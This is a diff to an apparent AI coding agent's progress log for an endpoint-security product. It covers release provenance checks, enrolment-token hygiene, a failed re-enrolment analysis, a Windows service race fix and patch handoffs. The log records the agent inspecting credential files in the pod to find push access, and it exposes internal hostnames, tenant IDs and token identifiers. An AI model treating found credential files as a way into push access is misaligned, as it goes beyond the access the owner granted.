+    branch HEADs. Most consistent explanation: a manual `vercel --prod` from a working
+    directory (apps/nivxray-xdr/.vercel/project.json is a CLI link), which also explains the
+    "production deployment config differs from project settings" warning on BOTH projects.
+  * a3523a88 is NOT in the GitHub repo (upload-pack: "not our ref") => Emergent-local snapshot
+    lineage. Save to GitHub would create a NEW commit; the target branch is chosen in the
+    Emergent UI (no branch is pinned in .emergent/emergent.yml).
+  * BUILD MODEL: XDR (`yarn build` -> dist) only makes sense with Root Directory =
+    apps/nivxray-xdr; EDR (`cd apps/nivxray-xdr && vite build` -> apps/nivxray-xdr/dist) only
+    makes sense with Root Directory = repo root. ROOT DIRECTORY WAS NOT IN THE SCREENSHOTS =
+    the one missing fact. CRITICAL: vercel.json is only honoured at the project Root
+    Directory, and ONLY vercel-build.sh sets XDR_PROD_API_ORIGIN/NIVX_PRODUCT_SCOPE, writes
+    build-info.json and runs verify-production-build.js. A build that bypasses it points the
+    console at the PREVIEW backend and drops ProductScopeGuard.
+
+- XDR SELECTOR RELEASE-DIFF PREPARATION (read-only; no merge, no push, no deploy). PROVEN:
+  * ACCEPTED SOURCE COMMIT: 3aeef2f2 ("DEPLOYMENT_ENROLLMENT_FOUNDATION"), /app lineage.
+    Release scope = exactly 2 files, +28/-6:
+      apps/nivxray-xdr/src/xdr/admin/AdminTenantGate.jsx        (+14/-3)
+      apps/nivxray-xdr/src/xdr/components/XdrScopeNavigator.jsx (+20/-6... net +20/-3)
+    Patch exported to /tmp/b8-selector.patch (239 lines).
+  * PRODUCTION SOURCE IDENTIFIED (owner's premise corrected): production was NOT built from
+    release/xdr-w1-candidate. That branch (9ae7bdac, 2026-09-18) does not contain
+    AdminTenantGate.jsx, XdrScopeNavigator.jsx, IntelligencePolicyBody.jsx,
+    src/lib/scopeApi.js, src/xdr/nx/apiError.js or any EdrAddDevicePage/EdrDownloadsPage -
+    yet the LIVE artifacts ship EdrAddDevicePage-*.js, EdrDownloadsPage-*.js and a
+    XdrAdminPage chunk containing data-testid "xdr-admin-tenant-gate".
+    REAL PRODUCTION BASE = github feature/rc2-alignment @ 6523ba1d (2026-09-26 18:15:11Z,
+    "PHASE 0 PROMOTION - STAGE 3 ... promotion is an owner-only Vercel action"); the two
+    Vercel projects built 18:19:37Z (xdr) and 18:20:24Z (edr) - 4 min later.
+    BLOB-LEVEL PROOF: 6523ba1d:AdminTenantGate.jsx = d905d42a = 3aeef2f2^:AdminTenantGate.jsx
+    and 6523ba1d:XdrScopeNavigator.jsx = e200cdf5 = 3aeef2f2^:XdrScopeNavigator.jsx.
+    The accepted patch's parent blobs ARE the production blobs.
+  * LIVE PRODUCTION IS PRE-FIX (confirmed by artifact, not inference): the live
+    XdrAdminPage-DdCw8LHM.js contains "scope/authorized" and "xdr-admin-tenant-gate" but
+    ZERO occurrences of "authorized_tenants" => it still reads the evidence-derived list.
+  * CHERRY-PICK SAFETY: `git apply --check` of /tmp/b8-selector.patch onto a worktree of
+    6523ba1d = CLEAN, zero fuzz, no unrelated changes. Onto release/xdr-w1-candidate it is
+    IMPOSSIBLE and UNSAFE: both target files are absent, their imports
+    (@/lib/scopeApi, @/xdr/nx/apiError) do not exist on that branch, XdrShell there renders
+    XdrContextBar (never XdrScopeNavigator) and no surface imports AdminTenantGate - so the
+    two files would be dead code AND the vite build would fail on unresolved imports.
+    release/xdr-w1-candidate IS a strict ancestor of 6523ba1d and of rc2; fast-forwarding it
+    would drag 1005 changed files (267 frontend) incl. EDR work - rejected as not minimal.
+  * DELTA RISK IF RELEASING FROM rc2 TIP INSTEAD OF PROD BASE: 6523ba1d..b42c34c7 = 138
+    commits, 303 files, 41 frontend source files (tenant.js, CustomerPicker, whole AMP/DT2
+    trajectory set). Not part of this release.
+  * ALREADY ON GITHUB: branch fix-authorized-tenant-selector (03f8e10, PR #2) = rc2 tip
+    b42c34c7 + 3 commits carrying the SAME authority contract (backend xdr_scope.py +
+    the same 2 frontend files). It differs from the accepted /app version only cosmetically
+    (display_name rendering, "no XDR incidents" volume label, comments). It is NOT based on
+    the production base, so merging it releases the 138-commit delta too.
+  * BUILD PROOF (local only, nothing published): NIVX_PRODUCT_SCOPE=xdr
+    bash apps/nivxray-xdr/scripts/vercel-build.sh -> 2228 modules, built in 6.31s,
+    "XDR PRODUCTION BUILD GUARD . PASSED", api_origin https://nivxray.nivxforge.com,
+    product scope declared "xdr". `git status` CLEAN afterwards - no lockfile or tracked
+    file changed (dist/ is gitignored). Fresh artifact contains "authorized_tenants" in
+    XdrAdminPage-*.js and XdrShell-*.js.
+  * STILL OWNER-ONLY (not provable from the repo): which Git branch/project the two Vercel
+    projects are linked to, and whether promotion is Git-integration or `vercel --prod`.
+    The 4-minute gap + apps/nivxray-xdr/.vercel/project.json CLI link + the "production
+    deployment config differs from project settings" warning all point to a manual
+    `vercel --prod`. Vercel Root Directory must be apps/nivxray-xdr so vercel.json and
+    scripts/vercel-build.sh are honoured; a build that bypasses the script points the console
+    at the PREVIEW backend and drops ProductScopeGuard.
+  * NOTHING MERGED, PUSHED OR DEPLOYED. EDR untouched. phase2/edr-production untouched.
+    No tenants/users/tokens. Backend authority unchanged.
+
+- B8-SCOPE-1 CANDIDATE PREPARED (2026-09-30). Owner-approved base feature/rc2-alignment@6523ba1d.
+  * Branch release/xdr-b8-selector-candidate, local commit c927f626, tree
+    b3e26825529022990dd6ca30b2474f18876108d8. diff --name-only 6523ba1d..candidate = exactly
+    AdminTenantGate.jsx + XdrScopeNavigator.jsx, 2 files +28/-6, byte-identical to 3aeef2f2.
+  * Build guard on the candidate tree: 2209 modules, 6.28s, XDR PRODUCTION BUILD GUARD PASSED.
+  * PUSH BLOCKED: /root/.git-credentials stale ("Invalid username or token"); /app/.tok is a
+    JWT, not a GitHub PAT. Branch creation on GitHub is an OWNER action. Patch + exact recipe
+    persisted at docs/releases/B8_SCOPE_1_xdr_selector.patch and
+    docs/releases/B8_SCOPE_1_XDR_SELECTOR_CANDIDATE.md.
+  * SECURITY DEBT: .tok (a JWT) is committed at repo root on every branch inspected.
+  * NEXT GATE: Vercel XDR project Root Directory = apps/nivxray-xdr + branch linkage, then
+    deploy the isolated candidate, acceptance, then move to KUSHU enrollment.
+  * GITHUB BRANCH release/xdr-b8-selector-candidate EXISTS (owner-created): f8d48349 +
+    983f5680 on base 6523ba1d229004abc38f23a9d36be8d278e65e99. It is a RECONSTRUCTION, not
+    the reviewed bytes: 2 files but +15/-6 (missing the 13 reviewed comment lines, different
+    local variable names, and `t.display_name || t.customer` where the reviewed AdminTenantGate
+    renders `display_name · customer`). Functionally equivalent (authority list + volumes Map)
+    except that one admin option label.
+  * AGENT CANNOT PUSH: `git push` -> "could not read Username for https://github.com". No
+    usable GitHub credential in the pod. "Save to GitHub" would push the /app workspace tree
+    (different lineage), NOT a 2-file diff, so it is not a valid release path either.
+  * REALIGNMENT PATCH PROVIDED: docs/releases/B8_SCOPE_1_align_github_branch_to_reviewed_bytes.patch
+    (+21/-8 on top of 983f5680). Applying it makes the branch byte-identical to the reviewed
+    candidate, and the diff vs base becomes exactly 2 files / +28/-6. Verified in a worktree.
+
+- KUSHU C0.5 PRE-ENROLMENT READINESS (read-only; nothing minted, enrolled, executed or
+  deployed). VERDICT = HOLD on three owner-verifiable items; NO DEFECT FOUND.
+  * Production health PASS: GET https://nivxray.nivxforge.com/api/health ->
+    {"status":"ok","service":"nivxray-api"}.
+  * Enrollment control plane LIVE and auth-enforced (403 "Not authenticated" unauthenticated):
+    POST/GET /api/edr/enrollment/tokens, POST /api/edr/enrollment/tokens/{id}/revoke,
+    GET /api/edr/enrollment/endpoints. All TENANT_SCOPED via explicit X-Tenant-Id.
+    /api/edr/onboarding/downloads does NOT exist (404) - the packages route is
+    /api/edr/onboarding/packages.
+  * TOKEN INVENTORY NOT VERIFIABLE BY THE AGENT: production auth is owner-only
+    (admin@nivxray.com is PREVIEW-only). OLD_UNLABELED_TOKEN_ACTIVE = UNVERIFIED.
+    By design GET /tokens is metadata-only ("No route returns a token's plaintext or its
+    stored digest") and mint returns the plaintext exactly once, in the mint response.
+  * INSTALLER PROVENANCE PASS: GH run 36695465379 = workflow "NivXForge Windows Installer
+    (V1)", branch feature/rc2-alignment, head_sha b42c34c7, status completed /
+    conclusion success, created 2026-09-30T09:20:16Z. Artifact
+    NivXForgeEDRSetup-windows-x64, 19,825,130 bytes, expired=false, expires
+    2026-10-30T09:21:28Z. Expected exe SHA256
+    FE05C4A8E7246DBBB6D9850F9C4B80DDBFECE3175770B30D4A373D95FA6EDB7B (owner-recorded;
+    re-verify on KUSHU, the agent cannot read run logs unauthenticated).
+  * STDIN-ONLY CONTRACT PASS, with blob proof that the SHIPPED binary carries it:
+    b42c34c7:agents/nivxforge-windows/nivxforge_sensor.py = d0593501 = /app HEAD, and
+    nivxforge_setup.py = de994624 = /app HEAD. sensor.refuse_secret_on_command_line scans
+    the WHOLE argv before argparse, rejects LEGACY_TOKEN_FLAGS and any enr_/nvxenr_ shaped
+    value (name or =value) without echoing it; read_enrolment_secret reads stdin only;
+    setup.install raises unless --token-stdin (required=True on the sensor parser).
+    Workflow gates assert the argv refusal and the --token-stdin help text.
+    backend/edr_plane/enrollment/instructions.py windows_exe_invocation emits
+    Read-Host -AsSecureString -> SecureStringToBSTR -> PtrToStringBSTR | exe --token-stdin
+    -> finally ZeroFreeBSTR + Remove-Variable. No --token/-EnrollmentToken plaintext form.
+  * NO LATER CODE INVALIDATES C0.5: zero commits touch agents/nivxforge-windows between
+    b42c34c7 and /app HEAD. NOTE instructions.py was created in 3aeef2f2 (AFTER b42c34c7)
+    so it is absent from the installer build commit, but the deployer RCA confirmed it IS
+    present and importable in the DEPLOYED production backend - instruction text and binary
+    behaviour agree.
+  * OWNER DECISION CHANGE RECORDED: target tenant moved from "NivXForge Canary" (kind LAB,
+    never created) to "Internal Validation" ten_e759b7288598bd882e3dcac49d. Canary telemetry
+    will therefore land in a REAL validation tenant, not a disposable LAB tenant.
+  * TERMINOLOGY CORRECTION for acceptance: enrollment_state, credential_state and
+    sensor_state are THREE INDEPENDENT dimensions, not a chain. ENROLLED + ACTIVE +
+    ENROLLED_NEVER_REPORTED is a legal state and means nothing was collected.
+
+- DESKTOP-A9HGFJJ ACCIDENTAL REVOCATION — READ-ONLY RECOVERY ANALYSIS (nothing modified,
+  no token minted/revoked, no state changed, no restart, KUSHU untouched).
+  VERDICT: DESKTOP_CREDENTIAL_RECOVERY = SAFE_EXISTING_PATH.
+  * endpoint ep_1989031c8c1d0085812f, WINDOWS, 157,226 events, last telemetry
+    2026-10-01T02:22:52Z. UI now REVOKED/REVOKED/REVOKED + NOT TRUSTED.
+  * IDENTITY IS DETERMINISTIC, SO RE-ENROLMENT CANNOT DUPLICATE IT.
+    EndpointIdentity.mint (backend/edr_plane/contracts/identity.py:98) = pure
+    _iid("ep", tenant_id, kind, value) over precedence hardware processor_id > machine_guid >
+    device_iid > hostname. Same host + same tenant => the SAME ep_1989031c8c1d0085812f. The
+    agent never proposes an endpoint_id (router enroll() mints it server-side).
+    CLONE COLLISION NOT TRIGGERED: one physical host re-presenting its own processor_id is
+    the intended merge. The clone risk needs TWO hosts with no processor_id sharing a
+    machine_guid; it is unrelated to this recovery.
+  * RE-ENROLMENT PRESERVES THE SERVER-SIDE DELIVERY RECORD BY DESIGN (store.enroll, the
+    "P0-3 DEFECT FIX"): sensor_state/last_telemetry_at/event_count/last_heartbeat_at/
+    report_interval_seconds/cadence_basis/lifecycle_reported/outbox_queue_depth are written
+    $setOnInsert ONLY; identity + credential fields are $set. It then explicitly HEALS
+    sensor_state REVOKED -> REPORTING (or ENROLLED_NEVER_REPORTED if nothing was ever
+    delivered) and returns delivery_history_preserved=true.
+  * ROTATE IS NOT A RECOVERY PATH AFTER REVOKE. store.rotate_credential requires an ACTIVE
+    credential and raises NO_ACTIVE_CREDENTIAL (404). revoke_endpoint set every ACTIVE
+    credential to REVOKED and $inc auth_epoch, and killed all sessions. The UI's "Rotate"
+    button on a REVOKED row will therefore fail. Re-enrolment with ONE fresh token is the
+    only supported recovery.
+  * LOCAL EVIDENCE IS SAFE. sensor.enrol() writes ONLY identity.json (mkdir + write + chmod).
+    setup.install() stages the exe, ACLs the state dir, enrols, then
+    stop/delete/create/start the service. NOTHING in install touches outbox.jsonl,
+    outbox.offset, channels.json or the SQLite journal. ONLY `uninstall --purge` deletes the
+    state dir - it must never be used here.
+  * WHY THE BACKLOG IS INTACT: _drain advances OFFSET_FILE only AFTER a 2xx accept; on
+    401/403 it clears the session and re-seeks to the unadvanced offset; any other failure
+    prints "[journal] held at offset N" and breaks WITHOUT advancing. Write-after-accept =
+    no silent discard. The journal's cursors table is committed in the same transaction as
+    the evidence and advances with MAX(), so it cannot regress.
+  * ⚠ A SERVICE RESTART IS REQUIRED, AND IS THE ONE NON-OBVIOUS STEP. run() calls
+    _read_identity() ONCE before its loop, so the LIVE service holds the REVOKED credential
+    in memory for its whole lifetime. Re-writing identity.json alone will NOT resume
+    delivery. setup.install --re-enrol performs the restart itself (step 4), so no manual
+    restart is needed if recovery is done through the installer.
+  * SECURITY INCIDENT RAISED SEPARATELY: an enrolment token PLAINTEXT
+    (tok_dfa2e77665974af7, expiry 2026-10-01T03:00:29Z) was rendered by the UI, captured in
+    a screenshot and pasted into chat. Treat as COMPROMISED: confirm EXPIRED or revoke.
+    Second token tok_d9b4ad08c07249b0 expires 02:56:10Z. Neither may be used for recovery.
+  * TO VERIFY AFTER RECOVERY (possible classification gap, not asserted): the rejected-sensor
+    alarm reads "0 of 231 refused attempts came from an agent that HAD standing and lost it"
+    while DESKTOP is exactly such an agent. Check whether post-revoke session-open refusals
+    are classified as lost-standing rather than ENROLLMENT_TOKEN_INVALID.
+- OWNER-APPROVED PRODUCT REQUIREMENT (RECORDED, NOT IMPLEMENTED): reversible endpoint
+  DISABLE/ENABLE lifecycle, separate from destructive REVOKE CREDENTIAL and from
+  DELETE/OFFBOARD, with a second confirmation dialog naming the endpoint, consequence text,
+  visual separation of enrolment-token actions from endpoint-credential actions, and an
+  explicit Recover/Re-enrol action on a REVOKED row.
+  GAP CONFIRMED: no reversible authority exists today. EnrollmentState =
+  NEVER_ENROLLED|ENROLLMENT_PENDING|ENROLLED|REVOKED|RETIRED; CredentialState =
+  NONE|ACTIVE|ROTATION_PENDING|REVOKED; SensorState =
+  NO_SENSOR|ENROLLED_NEVER_REPORTED|REPORTING|SILENT|REVOKED. There is NO DISABLED/SUSPENDED
+  member and no enable/disable/reinstate route anywhere in edr_plane/enrollment or
+  routers/edr_enrollment.py. Minimum change set is recorded in the turn response.
+  INVARIANT TO PRESERVE: DISABLED != REVOKED != OFFBOARDED/DELETED.
+
+- DESKTOP RECOVERY --token-stdin FAILURE (read-only RCA; nothing modified, no mint/revoke,
+  no restart, no deploy, KUSHU untouched).
+  VERDICT: STDIN_RECOVERY_PATH = ARTIFACT_MISMATCH (+2 real code defects found).
+  * ROOT CAUSE, PROVEN BY EXACT STRING: the observed refusal "--token is required to enrol.
+    The installer carries no credential by design." is the PRE-HARDENING text, present up to
+    fe08077e (2026-09-30 03:06:55Z) and REPLACED in 572fa3ed (08:19:48Z) with "--token-stdin
+    is required to enrol ... and <STDIN_ONLY_NOTICE>". The exe on DESKTOP was therefore built
+    from a commit <= fe08077e and predates the stdin hardening. It is NOT the audited
+    artifact of run 36695465379 (head_sha b42c34c7, built 09:20:16Z) whose exe SHA256 is
+    FE05C4A8E7246DBBB6D9850F9C4B80DDBFECE3175770B30D4A373D95FA6EDB7B.
+  * WHY IT DID NOT SAY "unrecognized arguments": main() uses
+    build_parser().parse_known_args(raw)[0]. At fe08077e the install subparser has --token
+    and NO --token-stdin, so parse_known_args SILENTLY DISCARDED --token-stdin, args.token
+    stayed None, STAGE and PROTECTED STATE ran, and enrolment refused. Reproduced locally
+    with the fe08077e parser definition: strict parse_args exits 2 with "unrecognized
+    arguments: --token-stdin", parse_known_args returns token=None. The hardened build's own
+    comment predicted the mirror image of this trap.
+  * NO STDIN CONSUMER EXISTED. There is no subprocess: setup calls sensor.enrol() in-process
+    and only the HARDENED sensor.read_enrolment_secret() reads sys.stdin. In the old build
+    nothing reads stdin at all, so the piped plaintext was never drained and was discarded
+    when the process exited. It never reached argv, disk, the registry, the service binPath
+    or Sysmon EID1. stdin was NOT consumed earlier by PyInstaller.
+  * ⚠ THE SERVICE WAS ALMOST CERTAINLY LEFT STOPPED - ACQUISITION GAP FORMING.
+    install() STAGE runs BEFORE enrolment and stops the service twice: once when
+    source != INSTALLED_EXE (sc stop, then copy2 over INSTALLED_EXE) and again inside
+    _stage_service_host() (sc stop, then copytree over SERVICE_DIR). Step 3 then raised
+    SystemExit, so step 4 (sc create + sc start) NEVER RAN. A clean `sc stop` does not
+    trigger the configured failure/restart actions, and AUTO_START only applies at boot.
+    The on-disk service image was ALSO overwritten with the OLD build's onedir payload.
+  * EVIDENCE IS STILL SAFE: nothing in STAGE or _protect_state_dir touches identity.json,
+    outbox.jsonl, outbox.offset, channels.json or the SQLite journal; _protect_state_dir only
+    re-applies ACLs. Only `uninstall --purge` deletes state.
+  * RECOVERY TOKEN: unused, so still ACTIVE until TTL. Not consumed by the failed run.
+    Treat as spent for hygiene; revoke or let it expire. Do not reuse it.
+  * DEFECT 1 (P0, NOT FIXED): install() must not stop the running service during STAGE
+    before enrolment has succeeded, and must restart it on ANY failure. Today a failed
+    re-enrolment silently blinds a previously healthy endpoint. Fix = stage to a temp dir,
+    do enrolment first, or wrap steps 1-4 in try/finally that restarts the service.
+  * DEFECT 2 (P1, NOT FIXED): the install subcommand should reject unknown flags
+    (strict parse_args) while keeping the SERVICE_FLAG carve-out, so a wrong-version binary
+    says "unrecognized argument" instead of a misleading credential refusal.
+  * DEFECT 3 (P1, NOT FIXED): no build/version provenance check. install should print its
+    own build commit/SHA256 at STAGE and refuse a downgrade over a newer installed state.
+
+- P0 FIX IMPLEMENTED (2026-10-01): WINDOWS RE-ENROL STAGING RACE / SERVICE FILE LOCK.
+  WINDOWS_REENROL_STAGING_FIX = HOLD (code+tests PASS; the Windows ARTIFACT cannot be built
+  from this pod - no GitHub push credential, and PyInstaller cannot cross-compile a PE).
+  * ROOT CAUSE: `sc.exe stop` is asynchronous. install() STAGE stopped the service and
+    immediately replaced its image, racing the dying process ->
+    "Permission denied: C:\Program Files\NivXForge\sensor\service\NivXForgeSensor.exe".
+    Step 3 then aborted, so step 4 (sc create + sc start) never ran and a healthy endpoint
+    went dark.
+  * agents/nivxforge-windows/nivxforge_setup.py:
+      _service_state()            SCM state by NAME (localisation-safe), "" if absent
+      _wait_for_service_state()   deterministic poll to a target state
+      _image_is_released()        same-directory rename probe = honest proof no handle
+      _wait_for_image_release()   bounded wait for the handle to go
+      _stop_service_and_wait()    stop, PROVE STOPPED, PROVE released; FAILS CLOSED
+      _restore_service()          rollback; restarts ONLY a service that WAS running
+      _replace_tree()             bounded-retry copytree for the post-exit lock window
+      build_identity()            baked commit/run provenance (nivxforge_build.py)
+      self_digest()               SHA256 of the running artifact, printed at STAGE
+      _sc()                       a missing sc.exe is a failed command, never an exception
+      _stage_service_host()       NO LONGER drives the SCM; REFUSES over a RUNNING service
+      install()                   reads prior service state first, wraps steps 1-4 in
+                                  try/except BaseException -> ROLLBACK -> re-raise
+      main()                      unknown args now REFUSED (an ignored flag is how the
+                                  pre-hardening build pretended to accept --token-stdin)
+      version                     reports build_commit/build_run_id/artifact_sha256/state
+  * build_windows_installer.ps1 generates nivxforge_build.py (commit/time/run id) and
+    PyInstaller carries it (--hidden-import nivxforge_build). .gitignore excludes it.
+  * windows-sensor-installer.yml: artifact contract now asserts build provenance,
+    artifact_sha256 and unknown-argument refusal; NEW GATE 4 "Re-enrol against a RUNNING
+    service · stop race + rollback" proves, against the real SCM and real NTFS locks:
+    RUNNING-guard, stop-and-prove, restore idempotence, and that a FAILED frozen
+    `install --re-enrol` (stdin closed, no token) leaves the service RUNNING.
+  * TESTS: backend/tests/edr/test_p0_windows_reenrol_staging_race.py - 18 passed, incl. the
+    exact live PermissionError reproduction, stop timeout fail-closed, locked image,
+    staging-failure rollback, enrolment-failure rollback with NO token read/consumed,
+    operator-stopped service NOT silently started, state/outbox/offset/cursors byte-identical
+    after failure AND after a successful re-enrol (endpoint_id preserved), resume without a
+    token, unknown-flag refusal, --token not reintroduced, provenance + digest.
+  * TWO STALE TESTS UPDATED to the new contract (they asserted the defective behaviour):
+    test_windows_installer_scm_entrypoint::test_staging_refuses_to_overwrite_a_running_service_image
+    test_windows_installer_service_stage4::test_running_service_is_stopped_AND_PROVED_before_the_binary_is_replaced
+  * REGRESSION: cd /app/backend && pytest tests/edr + the 4 windows suites + B8 scope ->
+    2122 passed, 3 skipped, 0 failed (226s).
+  * NOT DONE, OWNER ACTION: trigger workflow_dispatch on windows-sensor-installer.yml to
+    produce the new exe + SHA256. DESKTOP and KUSHU untouched, no token minted/revoked/used,
+    nothing deployed.
+
+- P0 OWNER GITHUB HANDOFF PREPARED (2026-10-01). Nothing pushed, merged, deployed or
+  triggered. DESKTOP and KUSHU untouched. No token minted/used/revoked.
+  * The platform auto-commit had already folded the P0 work into
+    4b6a08b7 on feature/rc2-alignment TOGETHER WITH unrelated files
+    (apps/nivxray-xdr-response/data/executions.db-shm, executions.db-wal, memory/PRD.md).
+    That commit was NOT altered, reset or discarded.
+  * CLEAN ISOLATED COMMIT, built in a temporary worktree so /app was never checked out:
+      branch  fix/windows-reenrol-staging-race   (local only, lives in /app/.git)
+      commit  a0e402af3f357f749e46bca4d428939da8a802dc
+      parent  ee0348e260930b49e970d514879cb1afe37f90df
+      7 files, +855/-56, and all 7 blobs are BYTE-IDENTICAL to 4b6a08b7.
+      Excluded: the two SQLite artifacts and memory/PRD.md.
+  * PATCH: .git/handoff/P0_WINDOWS_REENROL_STAGING_RACE.patch (also /tmp, which gets wiped)
+      1150 lines, 52,657 bytes,
+      sha256 dd74074a41d5a4dbc01eb17a711e8f9c5b45c3f8cef1b18ea5172005cb1fe83f
+      Secret-scanned: clean (only test placeholders nvx_placeholder_value_for_test_only,
+      a-single-use-secret, ten_ci_gate4_not_a_real_tenant). Kept OUTSIDE version control
+      under .git/, so it can never enter a commit.
+  * GITHUB BASE VERIFIED: refs/heads/feature/rc2-alignment =
+    b42c34c7964869c62baf1c1340154401a752e348 (ls-remote). All 6 modified files are
+    byte-identical at b42c34c7 and at the patch parent, and `git apply --check` of the
+    patch on a worktree of b42c34c7 is CLEAN, zero fuzz. Applying it = 1 commit ahead of
+    the verified GitHub base. The 15 commits between b42c34c7 and ee0348e2 are NOT needed.
+  * NOTE: refs/heads/release/xdr-b8-selector-candidate has moved to e2f15a25 (was 983f5680).
+  * NO DOWNLOAD LINK IS POSSIBLE from this pod: the preview host does not serve
+    frontend/public (even pre-existing tracked files under /downloads/ return index.html),
+    and adding a backend route would be an implementation change. Owner must copy the patch
+    out of .git/handoff/.
+  * Build workflow for the new artifact: .github/workflows/windows-sensor-installer.yml,
+    trigger workflow_dispatch (no inputs), job runs-on windows-latest, artifact
+    NivXForgeEDRSetup-windows-x64 (exe + SHA256SUMS.txt + build-info.json + gate0/*.json),
+    retention 30 days. NOT TRIGGERED.
+  * EVIDENCE STATUS UNCHANGED: 2122 passed / 3 skipped / 0 failed is PREVIOUSLY REPORTED
+    Linux evidence. NO new run. GATE 4 HAS NOT RUN. WINDOWS_REENROL_STAGING_FIX = HOLD.
+  * PUSH CAPABILITY RE-TESTED 2026-10-01 after the remote branch was created: STILL
+    UNAVAILABLE. /root/.git-credentials is now 0 BYTES (was 124 and stale), no git remote in
+    /app, no gh CLI, no GitHub env token; `git push` -> "could not read Username". Anonymous
+    READ works: ls-remote confirms refs/heads/fix/windows-reenrol-staging-race =
+    b42c34c7964869c62baf1c1340154401a752e348 exactly as the owner created it.
+    Platform answer: GitHub is OAuth-only, "the agent cannot commit or push on its own";
+    all pushes are owner-initiated via Save to GitHub. No PAT path exists.
+  * EXPORT ROUTE PREPARED (no repository code changed): the patch is now also at the repo
+    ROOT as /app/P0_WINDOWS_REENROL_STAGING_RACE.patch, kept untracked via
+    .git/info/exclude (a LOCAL file that is never committed), so it is visible in the VS
+    Code "Code" view for right-click -> Download. `git status` stays clean and the file can
+    never enter a commit. Copy also at .git/handoff/.
+  * ALTERNATIVE (owner choice): Save to GitHub publishes the workspace branch
+    feature/rc2-alignment incl. 4b6a08b7, whose 7 P0 blobs are BYTE-IDENTICAL to a0e402af,
+    so `git checkout <that commit> -- <the 7 paths>` reproduces the implementation
+    bit-exactly with zero retyping. SIDE EFFECTS TO ACCEPT: it also publishes the 15
+    session commits and the 3 unrelated files to rc2, and because
+    windows-sensor-installer.yml has a push trigger on agents/nivxforge-windows/** with NO
+    branch filter, that push would ALSO start a Windows build on rc2.
+  * SAVE-TO-GITHUB SCOPE CHECK (asked before the owner clicks): ANSWER IS NO, NOT GUARANTEED.
+    Save to GitHub publishes the WORKSPACE snapshot of the current branch
+    (feature/rc2-alignment @ feaa702d), not the isolated commit a0e402af. Targeting
+    fix/windows-reenrol-staging-race (= b42c34c7) it would write 26 FILES and carry 18
+    COMMITS, including every forbidden item: apps/.../executions.db-shm, executions.db-wal,
+    memory/PRD.md, docs/releases/*.patch, the B8 selector files, backend enrollment files,
+    deployer-agent-docs/RCA_*.MD. DO NOT CLICK IT for this release.
+  * The handoff patch was MOVED to /app/dist/P0_WINDOWS_REENROL_STAGING_RACE.patch, which is
+    ignored by the COMMITTED .gitignore (line 58 "dist"), so no packaging route can publish
+    it; it is still visible for VS Code right-click -> Download. The repo-root copy was
+    removed and .git/info/exclude restored to stock. git status is clean.
+
+- GATE 4 CI STDIN FIX - PATCH HANDOFF (2026-10-01). Nothing pushed/saved. HOLD unchanged.
+  * Gate 4 of run 36835748946 failed at PowerShell PARSE time on `--token-stdin < NUL`
+    ("The '<' operator is reserved for future use."), so the re-enrol rollback was NEVER
+    exercised. The generated artifact must NOT go near DESKTOP.
+  * CI-HARNESS-ONLY correction, one file, one hunk:
+    Start-Process -RedirectStandardInput with a 0-byte file (a valid EMPTY stream, so
+    read_enrolment_secret() is really entered and refuses), splatted parameters (no line
+    continuations - that is where the parse error lived), Resolve-Path for FilePath, plus
+    THREE STRICTER assertions: non-zero ExitCode, stdout+stderr concatenated, and the
+    refusal must be "stdin carried no enrolment secret" which only
+    sensor.read_enrolment_secret() raises AFTER stage 1 stopped the service (an early
+    argument refusal would also print ROLLBACK and make a pass vacuous).
+  * COMMIT BUILT ON THE REAL GITHUB TIP, not on the workspace:
+    refs/heads/fix/windows-reenrol-staging-race = d5467994ede50f228e4e7c736d71b7d9560730d6
+    (owner's push of the P0 commit; verified to contain exactly the 7 P0 files, and its
+    workflow file is byte-identical to the reviewed pre-image).
+    local branch gate4/ci-stdin-fix, commit daa033400c61d7e139365872c9d7d33c534f12cf,
+    diff-tree = exactly 1 file. `git apply --check` on d5467994 = CLEAN.
+  * PATCH: dist/GATE4_CI_STDIN_FIX.patch - 5,758 bytes, 108 lines,
+    sha256 3b330a7aaf90e979f295f45bc1a7586e33395fc3fb51278723b65789fdae166d
+    (copy at .git/handoff/). Ignored by the committed .gitignore line 58 "dist", so no
+    publishing route can include it. The earlier .diff was removed.
+  * nivxforge_setup.py untouched; --token-stdin preserved; no --token; no real token;
+    DESKTOP and KUSHU untouched; no production/backend/frontend change.
+
+- GATE 4 RUN #13 (commit 7897346d, run 36838666449) - READ-ONLY DIAGNOSIS. Nothing edited,
+  committed, pushed or saved. HOLD unchanged; the artifact must NOT go near DESKTOP.
+  * The PowerShell fix WORKED: Gate 4 executed for the first time and printed
+    "GATE4 PRECONDITION: RUNNING". The `< NUL` parse error is gone.
+  * NEW, DIFFERENT HARNESS DEFECT (not an installer defect): gate4_race.py imports the
+    SOURCE module and calls s._stage_service_host(). _service_payload_dir() reads
+    sys._MEIPASS, which exists ONLY in the frozen exe, so from source it returns None and
+    _stage_service_host() raises "this build carries no Windows service host payload" at
+    nivxforge_setup.py:387 - BEFORE reaching the RUNNING guard the gate exists to prove.
+    The harness then re-raised it as AssertionError on `assert "RUNNING" in text`, so the
+    step failed with "GATE 4 lifecycle checks failed". The later end-to-end section was
+    never reached; it correctly uses the FROZEN dist/NivXForgeEDRSetup.exe.
+  * PROPOSED MINIMAL REPAIR (one hunk, same Gate 4 step, 18 added lines): hand the source
+    module a byte-copy of the service host that the UPSTREAM "Service host unpacks from the
+    installer" gate already staged from the frozen artifact via `stage-host`
+    (shutil.copytree(s.SERVICE_DIR, payload); s._service_payload_dir = lambda: payload).
+    Payload packaging is already proved by that upstream gate; Gate 4 is about the SCM race.
+    No assertion removed, relaxed or bypassed; staging stays content-identical so the real
+    service image is not clobbered. The copy is taken BEFORE _install_service, so the image
+    is not locked.
+  * LOCAL VERIFICATION of the proposal: proposed YAML parses (12 steps); the extracted
+    gate4_race.py block compiles (53 lines); and a Linux simulation shows the exact
+    transition - before: "no Windows service host payload"; after: the RUNNING guard is
+    reached ("refusing to overwrite the image of a RUNNING NivXForgeSensor") and staging
+    then succeeds once STOPPED with byte-identical content.
+  * nivxforge_setup.py NOT modified. No production behaviour change. DESKTOP/KUSHU untouched.
+
+- READ-ONLY DEPLOYMENT READINESS CHECK for fix/edr-durable-ack-boundary @ 9273c964
+  (2026-10-01). NOTHING changed, deployed, restarted or mutated. Gate 4 still HOLD.
+  * Branch verified: 9273c964d959f942186d5f1ecee6ba896b15d0ce, parent 53287b82 (the Gate 4
+    payload fix - its workflow blob 8bcd04bb is IDENTICAL to the approved e793b9cf), on top
+    of 7897346d. Diff vs 7897346d = 6 files, +1077/-28: NEW
+    backend/edr_plane/processing_queue.py (506 lines), backend/routers/edr_enrollment.py
